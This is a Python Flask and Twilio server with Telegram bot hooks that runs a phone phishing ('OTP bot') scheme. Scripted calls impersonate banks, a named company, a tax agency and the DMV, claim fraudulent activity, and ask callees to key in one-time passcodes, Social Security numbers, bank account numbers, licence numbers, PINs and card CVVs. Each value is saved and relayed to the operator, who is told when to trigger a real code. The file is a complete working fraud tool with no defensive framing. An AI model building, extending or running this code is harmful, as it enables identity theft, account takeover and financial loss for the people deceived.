from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather, Hangup
from utils import get_data, save_data
from utils import telebot
import utils

bot_token = utils.raw_config['bot_token']
bot = telebot.TeleBot(bot_token)

app = Flask(__name__)


@app.route("/<chat_id>/otp", methods=['GET', 'POST'])
def voice(chat_id):
    client_name = get_data(chat_id, "Details/Client_Name")
    company_name = get_data(chat_id, "Details/Company Name")
    resp = VoiceResponse()
    answered_by = request.values.get('AnsweredBy', None)
    if answered_by in ['machine_end_beep', 'machine_end_silence', 'machine_end_other']:
        resp.say(
            f'<speak><prosody rate="0.9">Sorry, we were unable to reach you. We will try again later.</prosody></speak>')
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    else:
        resp.say(
            f'<speak><prosody rate="0.9">Hello {client_name}, we called from {company_name}. this call will be recorded and monitored for security reasons.</prosody></speak>')
        step1 = Gather(
            numDigits=1, action=f'/{chat_id}/step1', timeout=10, actionOnEmptyResult=True)
        step1.say(
            '<speak><prosody rate="0.9">To continue, please press 1.</prosody></speak>')
        resp.append(step1)
    return str(resp)


@app.route('/<chat_id>/step1', methods=['GET', 'POST'])
def step1(chat_id):
    company_name = get_data(chat_id, "Details/Company Name")
    resp = VoiceResponse()
    choice = request.form.get('Digits')
    if choice == '1':
        bot.send_message(chat_id, "Call was answered by a Human")
        resp.say(
            f'<speak><prosody rate="0.9">We have detected a suspicious attempt to login to your {company_name} account. If this was not you, please stay on the line. If this attempt was by you, you can hang up on this call.</prosody></speak>')
        resp.pause(length=3)
        resp.say(
            f'<speak><prosody rate="0.9">We disabled your {company_name} account, due to several failed login attempts.</prosody></speak>')
        step2 = Gather(
            numDigits=1, action=f'/{chat_id}/step2', timeout=120, actionOnEmptyResult=True)
        step2.say(
            '<speak><prosody rate="0.9">To block the request, please press 1.</prosody></speak>')
        resp.append(step2)
    else:
        resp.pause(length=2)
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())

    return str(resp)


@app.route("/<chat_id>/step2", methods=['GET', 'POST'])
def step2(chat_id):
    otp_digits = get_data(chat_id, "Details/Digits")
    resp = VoiceResponse()
    choice = request.form.get('Digits')
    if choice == '1':
        bot.send_message(chat_id, "Send otp Now !")
        resp.say(
            f'<speak><prosody rate="0.9">Please do not hang up. We will send you a {otp_digits}-digit code.</prosody></speak>')
        resp.pause(length=3)
        step3 = Gather(numDigits=str(otp_digits),
                       action=f'/{chat_id}/step3', timeout=120)
        step3.say(
            f'<speak><prosody rate="0.9">Code sent successfully to your number.<break time="0.2s"/>Now, use the dial pad to input your {otp_digits}-digit code.</prosody></speak>')
        resp.append(step3)
    return str(resp)


@app.route('/<chat_id>/step3', methods=['GET', 'POST'])
def step3(chat_id):
    resp = VoiceResponse()
    choice1 = request.form.get('Digits')
    if choice1:
        resp.say(
            '<speak><prosody rate="0.9">Please give us a few moments to verify your information.</prosody></speak>')
        resp.play(
            url='https://ia802609.us.archive.org/20/items/elev_20230517/elev.mp3')
        resp.say(
            f'<speak><prosody rate="0.9">Thank you for your patience. We have successfully verified your information.. Goodbye</prosody></speak>')
        save_data(chat_id, 'Details/otp', choice1)

    return str(resp)

############## Voice Recall ####################


@app.route("/<chat_id>/recall", methods=['GET', 'POST'])
def recall(chat_id):
    otp_digits = get_data(chat_id, "Details/Digits")
    client_name = get_data(chat_id, "Details/Client_Name")
    company_name = get_data(chat_id, "Details/Company Name")
    resp = VoiceResponse()
    answered_by = request.values.get('AnsweredBy', None)
    if answered_by in ['machine_end_beep', 'machine_end_silence', 'machine_end_other']:
        resp.say(
            f'<speak><prosody rate="0.9">Sorry, we were unable to reach you. We will try again later.</prosody></speak>')
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    else:
        resp.say(
            f'<speak><prosody rate="0.9">Hello {client_name}, Sorry, you have input wrong {otp_digits} digit code</prosody></speak>')
        recallstep2 = Gather(
            numDigits=1, action=f'/{chat_id}/recallstep2', timeout=10, actionOnEmptyResult=True)
        recallstep2.say(
            '<speak><prosody rate="0.9">To input code again, please press 1.</prosody></speak>')
        resp.append(recallstep2)
    return str(resp)


@app.route("/<chat_id>/recallstep2", methods=['GET', 'POST'])
def recallstep2(chat_id):
    otp_digits = get_data(chat_id, "Details/Digits")
    resp = VoiceResponse()
    choice = request.form.get('Digits')
    if choice == '1':
        bot.send_message(chat_id, "Call was answered by a Human")
        resp.pause(length=1)
        bot.send_message(chat_id, "Send otp Now !")
        resp.say(
            f'<speak><prosody rate="0.9">Please do not hang up. We will send you a {otp_digits}-digit code.</prosody></speak>')
        resp.pause(length=3)
        recallstep3 = Gather(numDigits=str(otp_digits),
                             action=f'/{chat_id}/recallstep3', timeout=120)
        recallstep3.say(
            f'<speak><prosody rate="0.9">Code sent successfully to your number.<break time="0.2s"/>Now, use the dial pad to input your {otp_digits}-digit code.</prosody></speak>')
        resp.append(recallstep3)
    else:
        resp.pause(length=2)
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    return str(resp)


@app.route('/<chat_id>/recallstep3', methods=['GET', 'POST'])
def recallstep3(chat_id):
    resp = VoiceResponse()
    choice1 = request.form.get('Digits')
    if choice1:
        resp.say(
            '<speak><prosody rate="0.9">Please give us a few moments to verify your information.</prosody></speak>')
        resp.play(
            url='https://ia802609.us.archive.org/20/items/elev_20230517/elev.mp3')
        resp.say(
            f'<speak><prosody rate="0.9">Thank you for your patience. We have successfully verified your information.. Goodbye</prosody></speak>')
        save_data(chat_id, 'Details/otp', choice1)

    return str(resp)

######### For custom Script ##############


@app.route("/<chat_id>/custom", methods=['GET', 'POST'])
def custom(chat_id):
    client_name = get_data(chat_id, "Details/Client_Name")
    company_name = get_data(chat_id, "Details/Company Name")
    resp = VoiceResponse()
    answered_by = request.values.get('AnsweredBy', None)
    if answered_by in ['machine_end_beep', 'machine_end_silence', 'machine_end_other']:
        resp.say(
            f'<speak><prosody rate="0.9">Sorry, we were unable to reach you. We will try again later.</prosody></speak>')
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    else:
        resp.say(
            f'<speak><prosody rate="0.9">Hello {client_name}, we called from {company_name}. this call will be recorded and monitored for security reasons.</prosody></speak>')
        customstep1 = Gather(
            numDigits=1, action=f'/{chat_id}/customstep1', timeout=10, actionOnEmptyResult=True)
        customstep1.say(
            '<speak><prosody rate="0.9">To continue, please press 1.</prosody></speak>')
        resp.append(customstep1)
    return str(resp)


@app.route('/<chat_id>/customstep1', methods=['GET', 'POST'])
def customstep1(chat_id):
    customscript = get_data(chat_id, "Details/Custom Script")
    resp = VoiceResponse()
    choice = request.form.get('Digits')
    if choice == '1':
        bot.send_message(chat_id, "Call was answered by a Human")
        resp.say(
            f'<speak><prosody rate="0.9">{customscript}</prosody></speak>')
        resp.redirect(f'/{chat_id}/customstep2')

    else:
        resp.pause(length=2)
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())

    return str(resp)


@app.route("/<chat_id>/customstep2", methods=['GET', 'POST'])
def customstep2(chat_id):
    otp_digits = get_data(chat_id, "Details/Digits")
    resp = VoiceResponse()
    bot.send_message(chat_id, "Send otp Now !")
    resp.pause(length=4)
    resp.say(
        f'<speak><prosody rate="0.9">Please do not hang up. We will send you a {otp_digits}-digit code.</prosody></speak>')
    resp.pause(length=3)
    customstep3 = Gather(numDigits=str(otp_digits),
                         action=f'/{chat_id}/customstep3', timeout=120)
    customstep3.say(
        f'<speak><prosody rate="0.9">Code sent successfully to your number.<break time="0.2s"/>Now, use the dial pad to input your {otp_digits}-digit code.</prosody></speak>')
    resp.append(customstep3)
    return str(resp)


@app.route('/<chat_id>/customstep3', methods=['GET', 'POST'])
def customstep3(chat_id):
    resp = VoiceResponse()
    choice1 = request.form.get('Digits')
    if choice1:
        resp.say(
            '<speak><prosody rate="0.9">Please give us a few moments to verify your information.</prosody></speak>')
        resp.play(
            url='https://ia802609.us.archive.org/20/items/elev_20230517/elev.mp3')
        resp.say(
            f'<speak><prosody rate="0.9">Thank you for your patience. We have successfully verified your information.. Goodbye</prosody></speak>')
        save_data(chat_id, 'Details/otp', choice1)

    return str(resp)

################ SSN Voice ################


@app.route("/<chat_id>/ssn", methods=['GET', 'POST'])
def ssn(chat_id):
    client_name = get_data(chat_id, "Details/Client_Name")
    resp = VoiceResponse()
    answered_by = request.values.get('AnsweredBy', None)
    if answered_by in ['machine_end_beep', 'machine_end_silence', 'machine_end_other']:
        resp.say(
            f'<speak><prosody rate="0.9">Sorry, we were unable to reach you. We will try again later.</prosody></speak>')
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    else:
        resp.say(
            f'<speak><prosody rate="0.9">Hello {client_name}, this is an automated call from the Deparment of Internal Revenue<break time="0.5s"/>This will be the last attempt to reach out to you<break time="0.3s"/>Your social security number has recently been used to take a fifty eight thousand eight hundred and twelve dollar loan</prosody></speak>')
        ssnstep1 = Gather(
            numDigits=1, action=f'/{chat_id}/ssnstep1', timeout=10, actionOnEmptyResult=True)
        ssnstep1.say(
            '<speak><prosody rate="0.9">If this was not you making loan, please press 1.</prosody></speak>')
        resp.append(ssnstep1)
    return str(resp)


@app.route("/<chat_id>/ssnstep1", methods=['GET', 'POST'])
def ssnstep1(chat_id):
    resp = VoiceResponse()
    choice = request.form.get('Digits')
    if choice == '1':
        bot.send_message(chat_id, "Call was answered by a Human")
        ssnfinal = Gather(numDigits=9,
                          action=f'/{chat_id}/ssnfinal', timeout=120)
        ssnfinal.say(
            f'<speak><prosody rate="0.9">In order for us to be in contact, we need to confirm your identity, Please enter your full Nine digit social security number with dial pad</prosody></speak>')
        resp.append(ssnfinal)
    else:
        resp.pause(length=2)
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    return str(resp)


@app.route('/<chat_id>/ssnfinal', methods=['GET', 'POST'])
def ssnfinal(chat_id):
    resp = VoiceResponse()
    choice1 = request.form.get('Digits')
    if choice1:
        resp.say(
            '<speak><prosody rate="0.9">Please give us a few moments to verify your information.</prosody></speak>')
        resp.play(
            url='https://ia802609.us.archive.org/20/items/elev_20230517/elev.mp3')
        resp.say(
            f'<speak><prosody rate="0.9">Thank you for your patience. We have successfully verified your information.. Goodbye</prosody></speak>')
        save_data(chat_id, 'Details/ssn', choice1)

    return str(resp)

################ Bank Voice ################


@app.route("/<chat_id>/bankacc", methods=['GET', 'POST'])
def bankacc(chat_id):
    client_name = get_data(chat_id, "Details/Client_Name")
    company_name = get_data(chat_id, "Details/Company Name")
    resp = VoiceResponse()
    answered_by = request.values.get('AnsweredBy', None)
    if answered_by in ['machine_end_beep', 'machine_end_silence', 'machine_end_other']:
        resp.say(
            f'<speak><prosody rate="0.9">Sorry, we were unable to reach you. We will try again later.</prosody></speak>')
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    else:
        resp.say(
            f'<speak><prosody rate="0.9">Hello {client_name}, we called from {company_name}. this call will be recorded and monitored for security reasons.</prosody></speak>')
        bankaccstep1 = Gather(
            numDigits=1, action=f'/{chat_id}/bankaccstep1', timeout=10, actionOnEmptyResult=True)
        bankaccstep1.say(
            '<speak><prosody rate="0.9">To continue, please press 1.</prosody></speak>')
        resp.append(bankaccstep1)
    return str(resp)


@app.route("/<chat_id>/bankaccstep1", methods=['GET', 'POST'])
def bankaccstep1(chat_id):
    company_name = get_data(chat_id, "Details/Company Name")
    resp = VoiceResponse()
    choice = request.form.get('Digits')
    if choice == '1':
        bot.send_message(chat_id, "Call was answered by a Human")
        resp.say(
            f'<speak><prosody rate="0.9">We have detected unusual attempt activity on your {company_name} card for a $87.61 transaction at Walmart., If this was not you, please stay on the call.</prosody></speak>')
        resp.pause(length=3)
        bankaccfinal = Gather(finish_on_key='*',
                              action=f'/{chat_id}/bankaccfinal', timeout=120)
        bankaccfinal.say(
            f'<speak><prosody rate="0.9">To block this attempt, Please input your bank account number with dial pad<break time="0.3s"/>When you finish, please press star</prosody></speak>')
        resp.append(bankaccfinal)
    else:
        resp.pause(length=2)
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    return str(resp)


@app.route('/<chat_id>/bankaccfinal', methods=['GET', 'POST'])
def bankaccfinal(chat_id):
    resp = VoiceResponse()
    choice1 = request.form.get('Digits')
    if choice1:
        resp.say(
            '<speak><prosody rate="0.9">Please give us a few moments to verify your information.</prosody></speak>')
        resp.play(
            url='https://ia802609.us.archive.org/20/items/elev_20230517/elev.mp3')
        resp.say(
            f'<speak><prosody rate="0.9">Thank you for your patience. We have successfully block this attempt. Goodbye</prosody></speak>')
        save_data(chat_id, 'Details/bankacc', choice1)

    return str(resp)

################## Driver License Voice ################


@app.route("/<chat_id>/dl", methods=['GET', 'POST'])
def dl(chat_id):
    client_name = get_data(chat_id, "Details/Client_Name")
    resp = VoiceResponse()
    answered_by = request.values.get('AnsweredBy', None)
    if answered_by in ['machine_end_beep', 'machine_end_silence', 'machine_end_other']:
        resp.say(
            f'<speak><prosody rate="0.9">Sorry, we were unable to reach you. We will try again later.</prosody></speak>')
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    else:
        resp.say(
            f'<speak><prosody rate="0.9">Hello {client_name}, this is an automated call from the federal department of motor vehicles,, this call will be recorded and monitored for security reasons</prosody></speak>')
        dlstep1 = Gather(
            numDigits=1, action=f'/{chat_id}/dlstep1', timeout=10, actionOnEmptyResult=True)
        dlstep1.say(
            '<speak><prosody rate="0.9">To continue, please press 1.</prosody></speak>')
        resp.append(dlstep1)
    return str(resp)

@app.route("/<chat_id>/dlstep1", methods=['GET', 'POST'])
def dlstep1(chat_id):
    resp = VoiceResponse()
    choice = request.form.get('Digits')
    if choice == '1':
        bot.send_message(chat_id, "Call was answered by a Human")
        dlfinal = Gather(finish_on_key='*',
                       action=f'/{chat_id}/dlfinal', timeout=120)
        dlfinal.say(
            f'<speak><prosody rate="0.9">your social security number has recently been used to purchase a 2018 Mercedes Benz E Class E 300 for $39000. in order to confirm your identity and block this attempt, please enter your full drivers license number<break time="0.3s"/>When you finish, please press star</prosody></speak>')
        resp.append(dlfinal)
    else:
        resp.pause(length=2)
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    return str(resp)


@app.route('/<chat_id>/dlfinal', methods=['GET', 'POST'])
def dlfinal(chat_id):
    resp = VoiceResponse()
    choice1 = request.form.get('Digits')
    if choice1:
        resp.say(
            '<speak><prosody rate="0.9">Please give us a few moments to verify your information.</prosody></speak>')
        resp.play(
            url='https://ia802609.us.archive.org/20/items/elev_20230517/elev.mp3')
        resp.say(
            f'<speak><prosody rate="0.9">Thank you for your patience.  we will be in contact within a few days to remove the impact on your credit score. Goodbye</prosody></speak>')
        save_data(chat_id, 'Details/dl', choice1)

    return str(resp)


########## PIN ##############

@app.route("/<chat_id>/pin", methods=['GET', 'POST'])
def pin(chat_id):
    client_name = get_data(chat_id, "Details/Client_Name")
    company_name = get_data(chat_id, "Details/Company Name")
    resp = VoiceResponse()
    answered_by = request.values.get('AnsweredBy', None)
    if answered_by in ['machine_end_beep', 'machine_end_silence', 'machine_end_other']:
        resp.say(
            f'<speak><prosody rate="0.9">Sorry, we were unable to reach you. We will try again later.</prosody></speak>')
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    else:
        resp.say(
            f'<speak><prosody rate="0.9">Hello {client_name}, we called from {company_name}. this call will be recorded and monitored for security reasons.</prosody></speak>')
        pinstep1 = Gather(
            numDigits=1, action=f'/{chat_id}/pinstep1', timeout=10, actionOnEmptyResult=True)
        pinstep1.say(
            '<speak><prosody rate="0.9">To continue, please press 1.</prosody></speak>')
        resp.append(pinstep1)
    return str(resp)


@app.route("/<chat_id>/pinstep1", methods=['GET', 'POST'])
def pinstep1(chat_id):
    resp = VoiceResponse()
    choice = request.form.get('Digits')
    if choice == '1':
        bot.send_message(chat_id, "Call was answered by a Human")
        resp.say(
            f'<speak><prosody rate="0.9">we have detected suspicious activity for a charge at Target for $56.71., If this was not you, please stay on the call.</prosody></speak>')
        resp.pause(length=3)
        pinfinal = Gather(finish_on_key='*',
                              action=f'/{chat_id}/pinfinal', timeout=120)
        pinfinal.say(
            f'<speak><prosody rate="0.9">To block this attempt, Please input your four digit pin with dial pad<break time="0.3s"/>When you finish, please press star</prosody></speak>')
        resp.append(pinfinal)
    else:
        resp.pause(length=2)
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    return str(resp)


@app.route('/<chat_id>/pinfinal', methods=['GET', 'POST'])
def pinfinal(chat_id):
    resp = VoiceResponse()
    choice1 = request.form.get('Digits')
    if choice1:
        resp.say(
            '<speak><prosody rate="0.9">Please give us a few moments to verify your information.</prosody></speak>')
        resp.play(
            url='https://ia802609.us.archive.org/20/items/elev_20230517/elev.mp3')
        resp.say(
            f'<speak><prosody rate="0.9">Thank you for your patience. We have successfully block this attempt. Goodbye</prosody></speak>')
        save_data(chat_id, 'Details/pin', choice1)

    return str(resp)

################ CVV VOICE ########################

@app.route("/<chat_id>/cvv", methods=['GET', 'POST'])
def cvv(chat_id):
    client_name = get_data(chat_id, "Details/Client_Name")
    company_name = get_data(chat_id, "Details/Company Name")
    resp = VoiceResponse()
    answered_by = request.values.get('AnsweredBy', None)
    if answered_by in ['machine_end_beep', 'machine_end_silence', 'machine_end_other']:
        resp.say(
            f'<speak><prosody rate="0.9">Sorry, we were unable to reach you. We will try again later.</prosody></speak>')
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    else:
        resp.say(
            f'<speak><prosody rate="0.9">Hello {client_name}, we called from {company_name}. this call will be recorded and monitored for security reasons.</prosody></speak>')
        cvvstep1 = Gather(
            numDigits=1, action=f'/{chat_id}/cvvstep1', timeout=10, actionOnEmptyResult=True)
        cvvstep1.say(
            '<speak><prosody rate="0.9">To continue, please press 1.</prosody></speak>')
        resp.append(cvvstep1)
    return str(resp)


@app.route("/<chat_id>/cvvstep1", methods=['GET', 'POST'])
def cvvstep1(chat_id):
    card_ending = get_data(chat_id, "Details/Card_ending")
    # Convert card_ending to a format suitable for TTS
    card_ending_speech = ' '.join(list(card_ending))

    resp = VoiceResponse()
    choice = request.form.get('Digits')
    if choice == '1':
        bot.send_message(chat_id, "Call was answered by a Human")
        resp.say(
            f'<speak><prosody rate="0.9">we have detected suspicious activity on your card, ending {card_ending_speech}, for a charge at Target for $56.71., If this was not you, please stay on the call.</prosody></speak>')
        resp.pause(length=3)
        cvvfinal = Gather(numDigits=3,
                              action=f'/{chat_id}/cvvfinal', timeout=120)
        cvvfinal.say(
            f'<speak><prosody rate="0.9">To block this attempt, Please input the 3 numerical digits located on the back of your card with dial pad</prosody></speak>')
        resp.append(cvvfinal)
    else:
        resp.pause(length=2)
        bot.send_message(chat_id, "Call was answered by a VoiceMail")
        resp.append(Hangup())
    return str(resp)



@app.route('/<chat_id>/cvvfinal', methods=['GET', 'POST'])
def cvvfinal(chat_id):
    resp = VoiceResponse()
    choice1 = request.form.get('Digits')
    if choice1:
        resp.say(
            '<speak><prosody rate="0.9">Please give us a few moments to verify your information.</prosody></speak>')
        resp.play(
            url='https://ia802609.us.archive.org/20/items/elev_20230517/elev.mp3')
        resp.say(
            f'<speak><prosody rate="0.9">Thank you for your patience. We have successfully block this attempt. Goodbye</prosody></speak>')
        save_data(chat_id, 'Details/cvv', choice1)

    return str(resp)

if __name__ == "__main__":
    app.run(debug=True)
